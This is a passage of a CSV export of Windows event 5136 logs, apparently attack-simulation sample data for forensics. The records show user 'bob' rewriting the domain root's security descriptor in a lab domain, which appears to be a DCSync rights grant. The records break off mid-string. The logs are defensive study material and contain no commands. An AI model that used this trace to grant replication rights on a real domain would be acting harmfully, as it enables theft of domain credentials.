ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;;RP;c7407360-20bf-11d0-a768-00aa006e0529;;RU)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;RU)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;AU)(OA;OICI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-738609754-2819869699-4189121830-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)""},{""@Name"":""OperationType"",""#text"":""%%14675""}]}}"
12,198242589,2019-03-25 21:28:45.0226312,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,2868,DC1.insecurebank.local,0,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: DC=insecurebank,DC=local",ObjectClass: domainDNS,AttributeLDAPDisplayName: nTSecurityDescriptor,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DACL_DCSync_Right_Powerview__Add-DomainObjectAcl.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""2ea9670c-f0f9-4d3f-90e5-a087e8c05863""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x40F2719""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""DC=insecurebank,DC=local""},{""@Name"":""ObjectGUID"",""#text"":""c6faf700-bfe4-452a-a766-424f84c29583""},{""@Name"":""ObjectClass"",""#text"":""domainDNS""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""nTSecurityDescriptor""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.15""},{""@Name"":""AttributeValue"",""#text"":""O:BAG:BAD:AI(OA;CIIO;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-738609754-2819869699-4189121830-522)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-498)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;;RP;c7407360-20bf-11d0-a768-00aa006e0529;;RU)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;RU)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;AU)(OA;OICI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-738609754-2819869699-4189121830-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)""},{""@Name"":""OperationType"",""#text"":""%%14674""}]}}"
13,198242590,2019-03-25 21:28:45.0236298,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3300,DC1.insecurebank.local,0,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: DC=insecurebank,DC=local",ObjectClass: domainDNS,AttributeLDAPDisplayName: nTSecurityDescriptor,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DACL_DCSync_Right_Powerview__Add-DomainObjectAcl.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""a1aa38aa-447e-46c2-aba0-d205d4d8f873""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x40F2719""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""DC=insecurebank,DC=local""},{""@Name"":""ObjectGUID"",""#text"":""c6faf700-bfe4-452a-a766-424f84c29583""},{""@Name"":""ObjectClass"",""#text"":""domainDNS""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""nTSecurityDescriptor""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.15""},{""@Name"":""AttributeValue"",""#text"":""O:BAG:BAD:AI(OA;CIIO;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-738609754-2819869699-4189121830-522)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-498)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;;RP;c7407360-20bf-11d0-a768-00aa006e0529;;RU)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;RU)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;AU)(OA;OICI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-738609754-2819869699-4189121830-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)""},{""@Name"":""OperationType"",""#text"":""%%14675""}]}}"
14,198242591,2019-03-25 21:28:45.0236298,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3616,DC1.insecurebank.local,0,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: DC=insecurebank,DC=local",ObjectClass: domainDNS,AttributeLDAPDisplayName: nTSecurityDescriptor,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DACL_DCSync_Right_Powerview__Add-DomainObjectAcl.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""a1aa38aa-447e-46c2-aba0-d205d4d8f873""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x40F2719""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""DC=insecurebank,DC=local""},{""@Name"":""ObjectGUID"",""#text"":""c6faf700-bfe4-452a-a766-424f84c29583""},{""@Name"":""ObjectClass"",""#text"":""domainDNS""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""nTSecurityDescriptor""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.15""},{""@Name"":""AttributeValue"",""#text"":""O:BAG:BAD:AI(OA;CIIO;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-738609754-2819869699-4189121830-522)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-498)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;;RP;c7407360-20bf-11d0-a768-00aa006e0529;;RU)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;RU)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;AU)(OA;OICI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-738609754-2819869699-4189121830-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)""},{""@Name"":""OperationType"",""#text"":""%%14674""}]}}"
15,198242592,2019-03-25 21:28:45.0236298,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,896,DC1.insecurebank.local,0,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: DC=insecurebank,DC=local",ObjectClass: domainDNS,AttributeLDAPDisplayName: nTSecurityDescriptor,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DACL_DCSync_Right_Powerview__Add-DomainObjectAcl.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""57dccd4c-7381-4371-8480-d74d47019ad8""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x40F2719""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""DC=insecurebank,DC=local""},{""@Name"":""ObjectGUID"",""#text"":""c6faf700-bfe4-452a-a766-424f84c29583""},{""@Name"":""ObjectClass"",""#text"":""domainDNS""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""nTSecurityDescriptor""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.15""},{""@Name"":""AttributeValue"",""#text"":""O:BAG:BAD:AI(OA;CIIO;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-738609754-2819869699-4189121830-522)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-498)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;;RP;c7407360-20bf-11d0-a768-00aa006e0529;;RU)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;RU)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;AU)(OA;OICI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-738609754-2819869699-4189121830-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(